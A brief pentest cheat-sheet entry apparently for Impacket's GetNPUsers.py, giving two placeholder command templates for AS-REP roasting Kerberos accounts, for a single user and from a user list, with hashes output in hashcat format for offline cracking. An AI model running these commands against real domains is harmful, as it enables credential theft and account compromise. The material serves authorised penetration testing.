# GetNPUsers (imp)

% impacket-kerberos, windows, kerberos, 88

## ASREPRoasting
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
```

## ASREPRoasting (userlist)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```
